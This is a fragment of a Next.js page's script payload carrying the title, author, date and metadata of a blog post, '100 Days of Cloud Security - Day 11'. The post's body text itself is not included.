ðŸš€\u003c/p\u003e\n"])</script><script>self.__next_f.push([1,"7:[\"$\",\"article\",null,{\"className\":\"max-w-4xl mx-auto px-4 py-8\",\"children\":[[\"$\",\"header\",null,{\"className\":\"mb-8 text-center\",\"children\":[[\"$\",\"h1\",null,{\"className\":\"font-headline text-3xl md:text-5xl font-bold text-primary mb-3\",\"children\":\"100 Days of Cloud Security - Day 11: Cloud Security Journey\"}],[\"$\",\"div\",null,{\"className\":\"text-muted-foreground text-sm md:text-base\",\"children\":[[\"$\",\"span\",null,{\"children\":[\"By \",\"Venkata Pathuri\",\" on \"]}],[\"$\",\"time\",null,{\"dateTime\":\"2025-11-20\",\"children\":\"November 20, 2025\"}]]}]]}],[\"$\",\"$L12\",null,{\"className\":\"my-8\"}],[\"$\",\"div\",null,{\"className\":\"prose prose-lg dark:prose-invert max-w-none prose-headings:text-primary prose-a:text-primary\",\"dangerouslySetInnerHTML\":{\"__html\":\"$13\"}}]]}]\n"])</script><script>self.__next_f.push([1,"d:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n9:null\n"])</script><script>self.__next_f.push([1,"14:I[622,[],\"IconMark\"]\nb:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"100 Days of Cloud Security - Day 11: Cloud Security Journey | Gitfolio Blogger\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Day 11 of my cloud security journey - Cloud Security Journey\"}],[\"$\",\"link\",\"2\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"32x32\"}],[\"$\",\"$L14\",\"3\",{}]],\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"10:\"$b:metadata\"\n"])</script></body></html>